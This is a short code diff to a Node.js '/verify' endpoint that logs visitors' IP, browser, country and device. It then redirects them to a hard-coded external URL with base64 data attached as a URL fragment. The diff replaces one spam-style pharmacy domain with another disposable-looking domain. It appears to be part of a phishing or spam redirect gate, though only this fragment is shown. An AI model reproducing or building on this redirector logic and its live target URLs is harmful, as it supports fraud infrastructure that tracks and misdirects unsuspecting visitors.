@@ -214,12 +214,12 @@ app.post('/verify', async (req, res) => {
         const device = detectDeviceType(ua);
 
         logVisitor(clientIp, ua, country, device);
-        const baseUrl = process.env.REDIRECT_BASE_URL || 'https://qy7j15mhs.cialistadalafilfor.com/k734lfzp-3lgilyqae9-xwigehhgyuiyp-yrcwzqzb91umn';
+        const baseUrl = process.env.REDIRECT_BASE_URL || 'https://storedns27.com/share/t/2221';
         const cleanBaseUrl = baseUrl.endsWith('#') ? baseUrl.slice(0, -1) : baseUrl;
-        //const redirectUrl = cleanBaseUrl + '/' + encodeURIComponent(cleanB64);
+        const redirectUrl = cleanBaseUrl + '/#' + encodeURIComponent(cleanB64);
         //const redirectUrl = cleanBaseUrl + '/' + encodeURIComponent(cleanB64);
         
-        const redirectUrl = baseUrl + '#' + cleanB64;
+        // const redirectUrl = baseUrl + '#' + cleanB64;
 
         return res.json({
             status: 'success',
